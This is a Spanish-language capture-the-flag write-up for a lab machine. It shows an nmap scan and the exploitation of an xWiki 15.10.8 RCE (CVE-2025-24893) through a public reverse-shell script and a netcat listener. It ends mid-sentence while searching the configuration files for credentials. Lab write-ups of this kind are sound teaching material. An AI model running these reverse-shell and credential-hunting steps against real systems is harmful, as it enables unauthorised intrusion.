#xWiki #RCE 

## Reconocimiento
Empezamos la maquina realizando un reconocimiento de puertos y servicios con [[NMAP]]:
`nmap -sS -p- --open --min-rate 5000 -n -Pn -vvv 10.10.11.80 -oG allPorts`

Encontramos los puertos `22, 80, 8080`

Añadimos la maquina al fichero `/etc/hosts`

Navegamos al puerto `80` por la web y encontramos que en el apartado `Docs` nos redirige a `wiki.editor.htb` para poder verlo correctamente lo volvemos a añadir al `/etc/hosts`

Navegando en la web de `http://wiki.editor.htb/xwiki/bin/view/Main/` vemos que la versión de `xWiki` es la `15.10.8`

Buscamos en internet información sobre esta versión y encontramos que es vulnerable a RCE, usamos el exploit de GitHub `https://github.com/Bishben/xwiki-15.10.8-reverse-shell-cve-2025-24893`
el cual nos explica como explotarlo.

## Explotación
Para explotarlo necesitamos ponernos primero en escucha con [[NETCAT]] en un puerto de nuestra maquina `nc -nlvp 4444`

Después deberemos ejecutar el Python 
`python3 cve-2025-24893.py <target_base_url> <lhost> <lport>`

En nuestro listenner obtendremos una Shell como `xWiki`
Si navegamos al directorio `/home` vemos que hay un usuario `Oliver`, para poder pivotar a el, buscaremos información en los archivos de configuración de `xWiki`

Estos ficheros de configuracion se encuentran en `/usr/lib/xwiki` exactamente miraremos el archivo 